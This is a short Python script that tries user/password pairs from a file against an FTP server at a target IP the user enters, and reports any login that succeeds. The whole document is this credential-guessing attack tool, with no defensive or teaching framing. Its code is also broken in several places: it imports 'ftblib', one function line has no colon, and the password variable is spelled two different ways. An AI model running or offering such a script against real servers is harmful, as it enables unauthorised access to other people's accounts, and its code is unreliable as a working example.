#!/usr/bin/python

import ftblib

def bruteLogin(hostname, passwdFile)
	try:
		pF = open(passwdFile, 'r')
	except:
		print("File Doesn't exist")
	for line in pF.readlines():
		userName = line.split(':')[0]
		paasWord = line.split(':')[1].strip('\n')
		print("Trying: ", userName, "/", passWord )
		try:
			ftp = ftplib.FTP(hostname)
			login = ftp.login(userName, passWord)
			print("Login Succeeded With", userName, "/", passWord)
			ftp.quit()
			return
		except:
			pass
	print("Password Not in List")




host = input("Enter Target's IP Address: ")
passwdFile = input("Enter User/Password file Path: ")
bruteLogin(host, passwdFile)
